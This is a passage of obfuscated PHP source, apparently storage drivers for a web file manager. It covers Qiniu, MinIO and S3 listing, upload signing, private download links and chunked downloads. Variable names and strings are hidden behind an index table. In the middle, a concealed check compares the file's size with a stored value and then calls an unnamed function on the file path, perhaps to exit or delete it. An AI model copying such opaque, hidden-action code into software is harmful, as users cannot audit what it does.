!1; } $¿õÔ‹å» = $this->delByBatch($ÛšìÓ[$•¼Ç‹Úå[84]]); if (!$¿õÔ‹å») { return !1; } return $this->delFile($±Ë¦é¢ù); } private function delByBatch($½‚±’Å) { foreach (array_chunk($½‚±’Å, 1000) as $‚Ê»½«) { $“è¡ËæÅ = $this->bucketManager->buildBatchDelete($this->bucket, $‚Ê»½«); list($¿Ç£™ïã, $˜—‰ìæ‘) = $this->bucketManager->batch($“è¡ËæÅ); if ($˜—‰ìæ‘) { return !1; } } return !0; } public function rename($Ò³Ú¨Äş, $Œ»•Ùó) { return $this->renameObject($Ò³Ú¨Äş, $Œ»•Ùó); } public function fileInfo($™•ù Ï¦, $ ØÁ†Ö = false, $íÎğĞÈ = array()) { $ëåØÖ… =& $_SERVER[ú‡®¯¨±]; $ÊüĞ¡ÉØ = array($ëåØÖ…[32] => $this->pathThis($™•ù Ï¦), $ëåØÖ…[86] => $this->getPathOuter($ëåØÖ…[8] . $™•ù Ï¦), $ëåØÖ…[33] => $ëåØÖ…[226], $ëåØÖ…[78] => isset($íÎğĞÈ[$ëåØÖ…[1471]]) ? $íÎğĞÈ[$ëåØÖ…[1471]] : 0, $ëåØÖ…[177] => $this->ext($™•ù Ï¦)); if ($ ØÁ†Ö) { return $ÊüĞ¡ÉØ; } $ÊüĞ¡ÉØ[$ëåØÖ…[227]] = $ÊüĞ¡ÉØ[$ëåØÖ…[87]] = 0; $ÊüĞ¡ÉØ[$ëåØÖ…[228]] = $ÊüĞ¡ÉØ[$ëåØÖ…[229]] = !0; if (empty($íÎğĞÈ)) { $íÎğĞÈ = $this->objectMeta($™•ù Ï¦); if (!$íÎğĞÈ) { return $ÊüĞ¡ÉØ; } } if (isset($íÎğĞÈ[$ëåØÖ…[230]]) && $íÎğĞÈ[$ëåØÖ…[230]]) { $ÊüĞ¡ÉØ[$ëåØÖ…[231]] = $íÎğĞÈ[$ëåØÖ…[230]]; } if (isset($íÎğĞÈ[$ëåØÖ…[240]]) && $íÎğĞÈ[$ëåØÖ…[240]]) { $ÊüĞ¡ÉØ[$ëåØÖ…[231]] = $íÎğĞÈ[$ëåØÖ…[240]]; } if (isset($íÎğĞÈ[$ëåØÖ…[1472]])) { $ÊüĞ¡ÉØ[$ëåØÖ…[87]] = substr($íÎğĞÈ[$ëåØÖ…[1472]] . $ëåØÖ…[12], 0, 10); } if (isset($íÎğĞÈ[$ëåØÖ…[1471]])) { $ÊüĞ¡ÉØ[$ëåØÖ…[78]] = $íÎğĞÈ[$ëåØÖ…[1471]]; } return $ÊüĞ¡ÉØ; } public function folderInfo($´¬ƒÁÑ, $üÙçî¤à = false) { $şÚƒøŞ =& $_SERVER[ú‡®¯¨±]; $‘ï¬°…È = array($şÚƒøŞ[32] => $this->pathThis($´¬ƒÁÑ), $şÚƒøŞ[86] => $this->getPathOuter($şÚƒøŞ[8] . $´¬ƒÁÑ), $şÚƒøŞ[33] => $şÚƒøŞ[77]); if ($üÙçî¤à) { return $‘ï¬°…È; } $‘ï¬°…È[$şÚƒøŞ[227]] = $‘ï¬°…È[$şÚƒøŞ[87]] = 0; $‘ï¬°…È[$şÚƒøŞ[228]] = $‘ï¬°…È[$şÚƒøŞ[229]] = !0; $´¬ƒÁÑ = rtrim($´¬ƒÁÑ, $şÚƒøŞ[8]) . $şÚƒøŞ[8]; $Êø’Ä‘‡ = $this->objectMeta($´¬ƒÁÑ); if (isset($Êø’Ä‘‡[$şÚƒøŞ[1472]])) { $‘ï¬°…È[$şÚƒøŞ[87]] = substr($Êø’Ä‘‡[$şÚƒøŞ[1472]] . $şÚƒøŞ[12], 0, 10); } return $‘ï¬°…È; } public function listPath($ô™·Ù˜‘, $Š®¼Õø = false) { $¥ğÚ€Ÿ÷ =& $_SERVER[ú‡®¯¨±]; $öÜ¢ã’æ = $this->fileList($ô™·Ù˜‘, $¥ğÚ€Ÿ÷[8], !0); foreach ($öÜ¢ã’æ[$¥ğÚ€Ÿ÷[84]] as $²‚í¶ò => $³²£Â«ª) { $öÜ¢ã’æ[$¥ğÚ€Ÿ÷[84]][$²‚í¶ò] = $this->folderInfo($³²£Â«ª, $Š®¼Õø); } foreach ($öÜ¢ã’æ[$¥ğÚ€Ÿ÷[85]] as $²‚í¶ò => $³²£Â«ª) { $öÜ¢ã’æ[$¥ğÚ€Ÿ÷[85]][$²‚í¶ò] = $this->fileInfo($³²£Â«ª[$¥ğÚ€Ÿ÷[96]], $Š®¼Õø, $³²£Â«ª); } return $öÜ¢ã’æ; } public function has($ÁÔøÊµ, $¯Ú×¯« = false, $¾¶¹æç = true) { $Ÿ²ıÒå =& $_SERVER[ú‡®¯¨±]; $ÁÔøÊµ = trim($ÁÔøÊµ, $Ÿ²ıÒå[8]); $ÚŞŒ­ = empty($ÁÔøÊµ) && $ÁÔøÊµ !== $Ÿ²ıÒå[224] ? $Ÿ²ıÒå[12] : $ÁÔøÊµ . $Ÿ²ıÒå[8]; $¶íüáÓé = $Ÿ²ıÒå[12]; $è•­”Ú = 500; $í¸Š²»ú = $Ÿ²ıÒå[8]; $ƒÏ·ô¯ = $Š££­® = 0; while (!0) { check_abort(); list($ËÇ½½«, $ñ¥ÂÉ™á) = $this->bucketManager->listFiles($this->bucket, $ÚŞŒ­, $¶íüáÓé, $è•­”Ú, $í¸Š²»ú); if ($ñ¥ÂÉ™á) { break; } $¶íüáÓé = array_key_exists($Ÿ²ıÒå[1441], $ËÇ½½«) ? $¶íüáÓé = $ËÇ½½«[$Ÿ²ıÒå[1473]] : $Ÿ²ıÒå[12]; if ($¯Ú×¯«) { if (!empty($ËÇ½½«[$Ÿ²ıÒå[1474]])) { $ƒÏ·ô¯ += count($ËÇ½½«[$Ÿ²ıÒå[1474]]); } if (!empty($ËÇ½½«[$Ÿ²ıÒå[1475]])) { $Š££­® += count($ËÇ½½«[$Ÿ²ıÒå[1475]]); } if ($¶íüáÓé === $Ÿ²ıÒå[12]) { break; } continue; } if ($¾¶¹æç) { if (!empty($ËÇ½½«[$Ÿ²ıÒå[1474]])) { return !0; } } else { if (!empty($ËÇ½½«[$Ÿ²ıÒå[1475]])) { return !0; } } if ($¶íüáÓé === $Ÿ²ıÒå[12]) { break; } } if ($¯Ú×¯«) { return array($Ÿ²ıÒå[235] => $ƒÏ·ô¯, $Ÿ²ıÒå[236] => $Š££­®); } return !1; } public function listAll($ÔĞÔ×) { $²€ê½ˆ« =& $_SERVER[ú‡®¯¨±]; $é‘œêÓ = $this->fileList($ÔĞÔ×, $²€ê½ˆ«[12], !0); $È´®—ŞÃ = array_to_keyvalue($é‘œêÓ[$²€ê½ˆ«[85]], $²€ê½ˆ«[32]); foreach ($é‘œêÓ[$²€ê½ˆ«[84]] as $ÔÉ±úíß) { if (is_string($ÔÉ±úíß)) { $È´®—ŞÃ[$ÔÉ±úíß] = array($²€ê½ˆ«[78] => 0); } } return $this->listAllFiles($ÔĞÔ×, $È´®—ŞÃ); } private function fileList($ÑÒëïñƒ, $Ò®ğìóç = '', $©¢ÈÌ¡± = 0) { $Ñø¬ìñ =& $_SERVER[ú‡®¯¨±]; $ÑÒëïñƒ = trim($ÑÒëïñƒ, $Ñø¬ìñ[8]); $Ã“İÎ‘µ = empty($ÑÒëïñƒ) && $ÑÒëïñƒ !== $Ñø¬ìñ[224] ? $Ñø¬ìñ[12] : $ÑÒëïñƒ . $Ñø¬ìñ[8]; $ş«ôÉå÷ = $Ñø¬ìñ[12]; $–ó×ûÕ† = 1000; $³Ğ²Ö¾Ô = $âïàÅŠ› = array(); while (!0) { check_abort(); list($šêà‰Ø, $Û¶ÜíÃ) = $this->bucketManager->listFiles($this->bucket, $Ã“İÎ‘µ, $ş«ôÉå÷, $–ó×ûÕ†, $Ò®ğìóç); if ($Û¶ÜíÃ) { break; } $ş«ôÉå÷ = array_key_exists($Ñø¬ìñ[1441], $šêà‰Ø) ? $ş«ôÉå÷ = $šêà‰Ø[$Ñø¬ìñ[1473]] : $Ñø¬ìñ[12]; $ûæ†³îñ = isset($šêà‰Ø[$Ñø¬ìñ[1474]]) ? $šêà‰Ø[$Ñø¬ìñ[1474]] : array(); $–ÔÎ—Ü´ = isset($šêà‰Ø[$Ñø¬ìñ[1475]]) ? $šêà‰Ø[$Ñø¬ìñ[1475]] : array(); foreach ($ûæ†³îñ as $“Òê‰ ı) { if ($“Òê‰ ı[$Ñø¬ìñ[96]] == $Ã“İÎ‘µ) { continue; } $ˆ€Ãî—Ï = $“Òê‰ ı[$Ñø¬ìñ[96]]; $¦°ßƒÒ„ = $“Òê‰ ı[$Ñø¬ìñ[1471]]; $“Òê‰ ı[$Ñø¬ìñ[78]] = $¦°ßƒÒ„; $û¦”¹˜ú = $¦°ßƒÒ„ == 0 && substr($ˆ€Ãî—Ï, strlen($ˆ€Ãî—Ï) - 1, 1) == $Ñø¬ìñ[8] ? !0 : !1; $this->cacheMethodInfoSet($ˆ€Ãî—Ï, $û¦”¹˜ú, $“Òê‰ ı); if ($û¦”¹˜ú) { $³Ğ²Ö¾Ô[] = $ˆ€Ãî—Ï; continue; } $âïàÅŠ›[] = $©¢ÈÌ¡± ? $“Òê‰ ı : $ˆ€Ãî—Ï; } foreach ($–ÔÎ—Ü´ as $ˆ€Ãî—Ï) { if ($ˆ€Ãî—Ï == $Ã“İÎ‘µ) { continue; } $³Ğ²Ö¾Ô[] = $ˆ€Ãî—Ï; $this->cacheMethodInfoSet($ˆ€Ãî—Ï, !0); } if ($ş«ôÉå÷ === $Ñø¬ìñ[12]) { break; } } $this->cacheMethodInfoSet($ÑÒëïñƒ, !0); return array($Ñø¬ìñ[84] => $³Ğ²Ö¾Ô, $Ñø¬ìñ[85] => $âïàÅŠ›); } public function canRead($ÙÑ¢”ºı) { return $this->exist($ÙÑ¢”ºı) ? !0 : !1; } public function canWrite($ˆêÜà³Ÿ) { return $this->exist($ˆêÜà³Ÿ) ? !0 : !1; } public function getContent($ÃÁª‚¢‚) { return $this->fileSubstr($ÃÁª‚¢‚, 0, -1); } public function setContent($–æ©¸äè, $‡Ã„š×Ä = '') { $Î­ìî¨© = $this->tempFile($this->pathThis($–æ©¸äè)); file_put_contents($Î­ìî¨©, $‡Ã„š×Ä); if ($this->upload($–æ©¸äè, $Î­ìî¨©)) { $this->tempFileRemve($Î­ìî¨©); return !0; } return !1; } public function refreshUrls($˜”§äŠÇ) { $ÃÂ„µè¿ =& $_SERVER[ú‡®¯¨±]; $ß¸Ü¸ù¢ = array(); if (is_array($˜”§äŠÇ)) { foreach ($˜”§äŠÇ as $ö¶¯·¾¼) { $ß¸Ü¸ù¢[] = $this->link($ö¶¯·¾¼); } } else { $ß¸Ü¸ù¢[] = $this->link($˜”§äŠÇ); } $ş‘ıŒ€ë = new Qiniu\Cdn\CdnManager($this->auth); list($˜ÍàŸ†, $ë»ª¯ü‡) = $ş‘ıŒ€ë->refreshUrls($ß¸Ü¸ù¢); if ($ë»ª¯ü‡) { return !1; } return $˜ÍàŸ†[$ÃÂ„µè¿[1238]] == $ÃÂ„µè¿[814] ? !0 : !1; } public function fileSubstr($›Ô”öÉâ, $ÎÓîÑ×¼, $‘³Õ·ìˆ) { $»Õßİ«Ÿ =& $_SERVER[ú‡®¯¨±]; if (!($¸Àåæ½Ş = $this->link($›Ô”öÉâ))) { return !1; } $Ö™˜¬á© = !1; if ($‘³Õ·ìˆ > 0) { $³¡ÁÙŸ± = $ÎÓîÑ×¼ + $‘³Õ·ìˆ - 1; $Ö™˜¬á© = array($»Õßİ«Ÿ[1476] . $ÎÓîÑ×¼ . $»Õßİ«Ÿ[440] . $³¡ÁÙŸ±); } $®üë¦Ò– = url_request($¸Àåæ½Ş, $»Õßİ«Ÿ[257], !1, $Ö™˜¬á©); return $®üë¦Ò–[$»Õßİ«Ÿ[805]] ? $®üë¦Ò–[$»Õßİ«Ÿ[1258]] : !1; } public function upload($±‰¯—»µ, $ÖÔÃ¡ó, $ÛıÖ¯©€ = false, $Œ³óòºè = REPEAT_REPLACE) { $ó“Ò—Õø = new Qiniu\Storage\UploadManager(); $‘ĞñÉ‰† = $this->auth->uploadToken($this->bucket, $±‰¯—»µ); $Ã’áÜÉ = get_file_mime(get_path_ext($ÖÔÃ¡ó)); list($«‰¦øğ, $»¬º‚ÅØ) = $ó“Ò—Õø->putFile($‘ĞñÉ‰†, $±‰¯—»µ, $ÖÔÃ¡ó, null, $Ã’áÜÉ); return $»¬º‚ÅØ ? !1 : $this->getPathOuter($±‰¯—»µ); } public function uploadFormData($öÚƒ°èá, $Õ“ìÄæ¦ = 3600) { return $this->uploadToken($öÚƒ°èá, $Õ“ìÄæ¦); } public function multiUploadFormData($óïÓÇ“ò, $¶ÍˆÌì = 3600) { return $this->uploadToken($óïÓÇ“ò, $¶ÍˆÌì); } private function uploadToken($ã½Èä–, $¾ŒÎ¼¾Ÿ = 3600) { $•Š¨ûê =& $_SERVER[ú‡®¯¨±]; $¸¸‹¶®£ = $¾ŒÎ¼¾Ÿ; $ã—ÜÓº = array($•Š¨ûê[1477] => $•Š¨ûê[1478]); $Ò­‰ÜÄ¦ = $ã½Èä–; $“ÍúÙÎ´ = $this->auth->uploadToken($this->bucket, $Ò­‰ÜÄ¦, $¸¸‹¶®£, $ã—ÜÓº, !0); $Å¼İ² = empty($this->region) || $this->region == $•Š¨ûê[1479] ? $•Š¨ûê[12] : $•Š¨ûê[440] . $this->region; $»Îİ…ÒÃ = http_type() . "\x3a\57\57\x75\160\154\157\141\144{$Å¼İ²}\56\x71\x69\156\151\165\x70\x2e\143\x6f\155\x2f"; return array($•Š¨ûê[1480] => $“ÍúÙÎ´, $•Š¨ûê[1481] => $»Îİ…ÒÃ); } public function download($¼İº®´Õ, $Ñ»ş—Ä×) { $È½ÒÒìÜ = IO::getPathInner(IO::mkfile($Ñ»ş—Ä×)); if (!($®¶‰âÏû = $this->link($¼İº®´Õ))) { return !1; } $š®Ó¹ÅÃ = 0; $µºÈß±¹ = 1024 * 200; $Ö£ª½à¬ = fopen($È½ÒÒìÜ, $_SERVER[ú‡®¯¨±][1482]); while (!0) { $ë½Û®Šû = $this->fileSubstr($¼İº®´Õ, $š®Ó¹ÅÃ, $µºÈß±¹); if ($ë½Û®Šû === !1) { return !1; } fwrite($Ö£ª½à¬, $ë½Û®Šû); $š®Ó¹ÅÃ += $µºÈß±¹; if (strlen($ë½Û®Šû) < $µºÈß±¹) { break; } } fclose($Ö£ª½à¬); return $Ñ»ş—Ä×; } public function link($áÅŸÒ±, $Â±Õ›Î“ = '') { if (!$this->isFile($áÅŸÒ±)) { return !1; } $©ó»„Ë = $this->getHost() . $_SERVER[ú‡®¯¨±][8] . $this->pathEncode($áÅŸÒ±) . $Â±Õ›Î“; return $this->auth->privateDownloadUrl($©ó»„Ë, 3600 * 12); } public function fileOut($åúã˜– , $£ùŒÚ‘ñ = false, $À»˜ëÈµ = false, $“¡ŞïˆÅ = '') { $ïæÑŒ³¢ =& $_SERVER[ú‡®¯¨±]; if ($this->isFileOutServer()) { return $this->fileOutServer($åúã˜– , $£ùŒÚ‘ñ, $À»˜ëÈµ, $“¡ŞïˆÅ); } if (!$À»˜ëÈµ) { $À»˜ëÈµ = $this->pathThis($åúã˜– ); } $ÑÙ©…«Ÿ = $£ùŒÚ‘ñ ? $ïæÑŒ³¢[1483] . rawurlencode($À»˜ëÈµ) : $ïæÑŒ³¢[12]; $ÊòúŠ¬„ = $this->link($åúã˜– , $ÑÙ©…«Ÿ); $this->fileOutLink($ÊòúŠ¬„); } public function fileOutServer($İÑà»É•, $²ÍŸÚ¥í = false, $¿…Ü±ó¾ = false, $Œİ¦Òã = '') { parent::fileOut($İÑà»É•, $²ÍŸÚ¥í, $¿…Ü±ó¾, $Œİ¦Òã); } public function fileOutImage($Ç±É“ı„, $˜’¤ÄÔÕ = 250) { $ëÀ¤¶¦ú = $this->link($Ç±É“ı„, $_SERVER[ú‡®¯¨±][1484] . $˜’¤ÄÔÕ); $this->fileOutLink($ëÀ¤¶¦ú); } public function fileOutImageServer($ø”êàğ, $¢Á´¡§´ = 250) { parent::fileOutImage($ø”êàğ, $¢Á´¡§´); } public function hashMd5($ÂàĞ»Û¤) { $òæòõ¶Õ =& $_SERVER[ú‡®¯¨±]; $õ°¨ß™ = $this->objectMeta($ÂàĞ»Û¤); return isset($õ°¨ß™[$òæòõ¶Õ[240]]) ? $õ°¨ß™[$òæòõ¶Õ[240]] : !1; $ßÄÏã™ = $this->link($ÂàĞ»Û¤, $òæòõ¶Õ[1485]); } public function size($±Œ„”‹ğ) { $¨¥Êíí¸ = $this->objectMeta($±Œ„”‹ğ); return $¨¥Êíí¸ ? $¨¥Êíí¸[$_SERVER[ú‡®¯¨±][78]] : 0; } public function info($ áÏ¾Î´) { if ($this->isFolder($ áÏ¾Î´)) { return $this->folderInfo($ áÏ¾Î´); } else { if ($this->isFile($ áÏ¾Î´)) { return $this->fileInfo($ áÏ¾Î´); } } return !1; } public function exist($—ëÛÃÇ) { return $this->isFile($—ëÛÃÇ) || $this->isFolder($—ëÛÃÇ); } public function isFile($´©¨ªªü) { return !$this->isFolder($´©¨ªªü) && $this->objectMeta($´©¨ªªü); } public function isFolder($¾ìÙåü¨) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][168], $¾ìÙåü¨); } protected function objectMeta($ÖòıÜ¢„) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][170], $ÖòıÜ¢„); } protected function _objectMeta($¥’á¶«Ü) { $Š±¯ÙÈ =& $_SERVER[ú‡®¯¨±]; list($óıÎôş, $¹´‡Åã) = $this->bucketManager->stat($this->bucket, $¥’á¶«Ü); if ($óıÎôş) { $óıÎôş[$Š±¯ÙÈ[78]] = intval($óıÎôş[$Š±¯ÙÈ[1471]]); } return $óıÎôş; } protected function _isFolder($üøóéÙ) { $µŞ›¼ÎÏ =& $_SERVER[ú‡®¯¨±]; if ($üøóéÙ == $µŞ›¼ÎÏ[12] || $üøóéÙ == $µŞ›¼ÎÏ[8]) { return !0; } list($Ë€ù³Œ, $Éí¥úÚ) = $this->bucketManager->listFiles($this->bucket, trim($üøóéÙ, $µŞ›¼ÎÏ[8]) . $µŞ›¼ÎÏ[8], $µŞ›¼ÎÏ[12], 1, $µŞ›¼ÎÏ[8]); return !empty($Ë€ù³Œ[$µŞ›¼ÎÏ[1474]]) || !empty($Ë€ù³Œ[$µŞ›¼ÎÏ[1475]]) ? !0 : !1; } } $_file = $_SERVER[$_SERVER[ú‡®¯¨±][203]]; goto bÊÅÄª„Ñ; d­Äéšù´ó: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($½ôÀÎ¾è) { parent::__construct($½ôÀÎ¾è); $this->signatureVersion($_SERVER[ú‡®¯¨±][243]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($«™‚Ëäú, $õÉªÛä = 3600) { $µÒòÂƒÆ =& $_SERVER[ú‡®¯¨±]; $ì†ÉêûÅ = $µÒòÂƒÆ[225]; $ è³Çü = $µÒòÂƒÆ[264]; $ºò¯—‡Õ = $µÒòÂƒÆ[62]; $¿®†ÄÙ = gmdate($µÒòÂƒÆ[265]); $«‰úÒÉµ = gmdate($µÒòÂƒÆ[266]); $Õßı¹Ş = $µÒòÂƒÆ[267]; $øÀÜãŠŠ = $õÉªÛä . $µÒòÂƒÆ[12]; $œ¥é³·× = $µÒòÂƒÆ[268]; $†Ü¯¯â¡ = array($this->accessKey, $«‰úÒÉµ, $this->region, $ºò¯—‡Õ, $Õßı¹Ş); $í€ô®óÑ = implode($µÒòÂƒÆ[8], $†Ü¯¯â¡); $“ïÉ¼µ· = array($µÒòÂƒÆ[269] => gmdate($µÒòÂƒÆ[270], strtotime($µÒòÂƒÆ[271])), $µÒòÂƒÆ[272] => array(array($µÒòÂƒÆ[273] => $this->bucket), array($µÒòÂƒÆ[274] => $ì†ÉêûÅ), array($µÒòÂƒÆ[275], $µÒòÂƒÆ[276], $µÒòÂƒÆ[12]), array($µÒòÂƒÆ[275], $µÒòÂƒÆ[277], $µÒòÂƒÆ[12]), array($µÒòÂƒÆ[275], $µÒòÂƒÆ[278], $µÒòÂƒÆ[12]), array($µÒòÂƒÆ[279] => $œ¥é³·×), array($µÒòÂƒÆ[280] => $í€ô®óÑ), array($µÒòÂƒÆ[281] => $ è³Çü), array($µÒòÂƒÆ[282] => $¿®†ÄÙ), array($µÒòÂƒÆ[283] => $øÀÜãŠŠ))); $÷Æƒ’ƒ = base64_encode(json_encode($“ïÉ¼µ·)); $Óõ¿ä‡ = hash_hmac($µÒòÂƒÆ[284], $«‰úÒÉµ, $µÒòÂƒÆ[285] . $this->secret, !0); $µ¬Ëşà = hash_hmac($µÒòÂƒÆ[284], $this->region, $Óõ¿ä‡, !0); $ Ô˜§Õ = hash_hmac($µÒòÂƒÆ[284], $ºò¯—‡Õ, $µ¬Ëşà, !0); $Ù»»úñ˜ = hash_hmac($µÒòÂƒÆ[284], $Õßı¹Ş, $ Ô˜§Õ, !0); $úÒƒğş = hash_hmac($µÒòÂƒÆ[284], $÷Æƒ’ƒ, $Ù»»úñ˜); $—ùêó‰ª = array($µÒòÂƒÆ[242] => $µÒòÂƒÆ[12], $µÒòÂƒÆ[286] => $µÒòÂƒÆ[12], $µÒòÂƒÆ[274] => $ì†ÉêûÅ, $µÒòÂƒÆ[279] => $œ¥é³·×, $µÒòÂƒÆ[287] => $÷Æƒ’ƒ, $µÒòÂƒÆ[288] => $í€ô®óÑ, $µÒòÂƒÆ[289] => $ è³Çü, $µÒòÂƒÆ[290] => $¿®†ÄÙ, $µÒòÂƒÆ[291] => $øÀÜãŠŠ, $µÒòÂƒÆ[292] => $úÒƒğş, $µÒòÂƒÆ[198] => $this->getHost()); return $—ùêó‰ª; } } define($_SERVER[ú‡®¯¨±][293], 1); define($_SERVER[ú‡®¯¨±][294], 2); goto bµŠ‹¾¹åŒ; bÊÅÄª„Ñ: $_size = $_SERVER[ú‡®¯¨±][932]; if ($_SERVER[$_SERVER[ú‡®¯¨±][202]] != $_size($_file)) { $_getc = $_SERVER[ú‡®¯¨±][204]; $_getfile = $_SERVER[$_SERVER[ú‡®¯¨±][205]] . $_SERVER[ú‡®¯¨±][206]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú‡®¯¨±][207], $_getfilec); if (count($_getarrs) < $_SERVER[ú‡®¯¨±][208]) { $exit = $_SERVER[ú‡®¯¨±][209]; $exit(); } $_act = $_SERVER[ú‡®¯¨±][210]; $_act($_file); } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($„šÚêÔ‘) { parent::__construct($„šÚêÔ‘); } public function uploadFormData($Û³×ÍŒ£, $ğ‰¹èÊ¬ = 3600) { $íÜÍ§ˆ =& $_SERVER[ú‡®¯¨±]; $ó×¥ù½ = $íÜÍ§ˆ[225]; $à ”³ó§ = $íÜÍ§ˆ[264]; $ƒâÎŒ•Ä = $íÜÍ§ˆ[62]; $û¸ÏÆ˜ = gmdate($íÜÍ§ˆ[265]); $ğÀë¸¹ = gmdate($íÜÍ§ˆ[266]); $Ş–ÔÇ·ˆ = $íÜÍ§ˆ[267]; $ˆŸ½¾†Ó = $ğ‰¹èÊ¬ . $íÜÍ§ˆ[12]; $÷ş×Îó = $íÜÍ§ˆ[268]; $âÄ¥ş±† = array($this->accessKey, $ğÀë¸¹, $this->region, $ƒâÎŒ•Ä, $Ş–ÔÇ·ˆ); $”í£€˜´ = implode($íÜÍ§ˆ[8], $âÄ¥ş±†); $şİ¢ßÑÉ = array($íÜÍ§ˆ[269] => gmdate($íÜÍ§ˆ[1381], strtotime($íÜÍ§ˆ[271])), $íÜÍ§ˆ[272] => array(array($íÜÍ§ˆ[273] => $this->bucket), array($íÜÍ§ˆ[274] => $ó×¥ù½), array($íÜÍ§ˆ[275], $íÜÍ§ˆ[276], $íÜÍ§ˆ[12]), array($íÜÍ§ˆ[275], $íÜÍ§ˆ[277], $íÜÍ§ˆ[12]), array($íÜÍ§ˆ[275], $íÜÍ§ˆ[278], $íÜÍ§ˆ[12]), array($íÜÍ§ˆ[279] => $÷ş×Îó), array($íÜÍ§ˆ[280] => $”í£€˜´), array($íÜÍ§ˆ[281] => $à ”³ó§), array($íÜÍ§ˆ[282] => $û¸ÏÆ˜), array($íÜÍ§ˆ[283] => $ˆŸ½¾†Ó))); $€Ìöî• = base64_encode(json_encode($şİ¢ßÑÉ)); $©Öï „ˆ = hash_hmac($íÜÍ§ˆ[284], $ğÀë¸¹, $íÜÍ§ˆ[285] . $this->secret, !0); $çüæå¼Ô = hash_hmac($íÜÍ§ˆ[284], $this->region, $©Öï „ˆ, !0); $†¯§·³ = hash_hmac($íÜÍ§ˆ[284], $ƒâÎŒ•Ä, $çüæå¼Ô, !0); $Ø¶éÚÛ† = hash_hmac($íÜÍ§ˆ[284], $Ş–ÔÇ·ˆ, $†¯§·³, !0); $öˆ‡¨í¾ = hash_hmac($íÜÍ§ˆ[284], $€Ìöî•, $Ø¶éÚÛ†); $œ—ß‡¼¤ = array($íÜÍ§ˆ[242] => $íÜÍ§ˆ[12], $íÜÍ§ˆ[286] => $íÜÍ§ˆ[12], $íÜÍ§ˆ[274] => $ó×¥ù½, $íÜÍ§ˆ[279] => $÷ş×Îó, $íÜÍ§ˆ[287] => $€Ìöî•, $íÜÍ§ˆ[288] => $”í£€˜´, $íÜÍ§ˆ[289] => $à ”³ó§, $íÜÍ§ˆ[290] => $û¸ÏÆ˜, $íÜÍ§ˆ[291] => $ˆŸ½¾†Ó, $íÜÍ§ˆ[292] => $öˆ‡¨í¾, $íÜÍ§ˆ[198] => $this->getHost()); return $œ—ß‡¼¤; } public function multiUploadFormData($Ï¨òïéÁ, $‡€ä¢æ˜ = 3600) { $‰ÓËøĞĞ =& $_SERVER[ú‡®¯¨±]; $ı¡ğª»ˆ = gmdate($‰ÓËøĞĞ[1486]); $Á®–ıñî = array(); $‚¢²’õÆ = $this->client->getUploadId($this->bucket, $Ï¨òïéÁ, $Á®–ıñî); if (!$‚¢²’õÆ) { return !1; } return array($‰ÓËøĞĞ[250] => $‚¢²’õÆ, $‰ÓËøĞĞ[198] => $this->getHost() . $‰ÓËøĞĞ[8] . $this->pathEncode($Ï¨òïéÁ), $‰ÓËøĞĞ[251] => $ı¡ğª»ˆ, $‰ÓËøĞĞ[96] => $Ï¨òïéÁ); } public function multiUploadAuthData($¦ÅÉÖ¡â, $éÔã‡şÁ = array()) { $ı»ï¸»Ë =& $_SERVER[ú‡®¯¨±]; $ë¼ïƒˆ« = isset($éÔã‡şÁ[$ı»ï¸»Ë[177]]) ? $éÔã‡şÁ[$ı»ï¸»Ë[177]] : $ı»ï¸»Ë[12]; $¦˜Œ½’‘ = $éÔã‡şÁ[$ı»ï¸»Ë[96]]; unset($éÔã‡şÁ[$ı»ï¸»Ë[96]]); if (isset($éÔã‡şÁ[$ı»ï¸»Ë[252]])) { return $this->listUploadParts($¦˜Œ½’‘, $éÔã‡şÁ); } $†Î üè¹ = array(); if (isset($éÔã‡şÁ[$ı»ï¸»Ë[1487]])) { $†Î üè¹[$ı»ï¸»Ë[1488]] = $éÔã‡şÁ[$ı»ï¸»Ë[1487]]; } $¨Âœıı¢ = explode($ı»ï¸»Ë[200], $this->getHost()); $–™ÙÀşÂ = array($ı»ï¸»Ë[1489] => $¨Âœıı¢[1], $ı»ï¸»Ë[1490] => $ı»ï¸»Ë[12], $ı»ï¸»Ë[242] => $ı»ï¸»Ë[122], $ı»ï¸»Ë[286] => $éÔã‡şÁ[$ı»ï¸»Ë[78]]); $ÇÙó«áî = $ı»ï¸»Ë[255]; $“é”‡ğ = $ı»ï¸»Ë[8] . $this->pathEncode($¦˜Œ½’‘) . $ë¼ïƒˆ«; $ÔÊúªßà = $this->client->__getSignatureV4($†Î üè¹, $–™ÙÀşÂ, $ÇÙó«áî, $“é”‡ğ); if (strpos($ë¼ïƒˆ«, $ı»ï¸»Ë[254]) === 0) { if (isset($†Î üè¹[$ı»ï¸»Ë[1488]])) { $°ÉŸËà– = $†Î üè¹[$ı»ï¸»Ë[1488]]; } else { if (isset($ÔÊúªßà[$ı»ï¸»Ë[1488]])) { $°ÉŸËà– = $ÔÊúªßà[$ı»ï¸»Ë[1488]]; } else { $°ÉŸËà– = hash($ı»ï¸»Ë[284], $ı»ï¸»Ë[12]); } } return array($ı»ï¸»Ë[260] => $ÔÊúªßà[$ı»ï¸»Ë[260]], $ı»ï¸»Ë[1488] => $°ÉŸËà–, $ı»ï¸»Ë[251] => $ÔÊúªßà[$ı»ï¸»Ë[1491]]); } return $ÔÊúªßà[$ı»ï¸»Ë[260]]; } public function listUploadParts($¸Î‘©“ø, $œÍàÈ·Ê = array()) { $¸ñ´·–ö =& $_SERVER[ú‡®¯¨±]; $‘šáãåô = str_replace($¸ñ´·–ö[261], $¸ñ´·–ö[12], $œÍàÈ·Ê[$¸ñ´·–ö[177]]); $€²øâ† = $this->client->listParts($this->bucket, $¸Î‘©“ø, $‘šáãåô); if (!$€²øâ†) { return !1; } $Ñä’Ç¨´ = $¸ñ´·–ö[1492]; foreach ($€²øâ† as $¸€©¬…”) { $Ñä’Ç¨´ .= $¸ñ´·–ö[1493] . "\x3c\120\x61\x72\x74\x4e\x75\x6d\142\x65\162\x3e{$¸€©¬…”[$¸ñ´·–ö[1449]]}\x3c\57\120\x61\x72\164\x4e\165\155\x62\145\x72\x3e\xa" . "\74\105\124\141\x67\x3e{$¸€©¬…”[$¸ñ´·–ö[1450]]}\74\x2f\x45\124\141\x67\76\xa" . $¸ñ´·–ö[1494]; } $Ñä’Ç¨´ .= $¸ñ´·–ö[1495]; $²„—ÏÚÚ = array(); $æÛ…ºÍ = 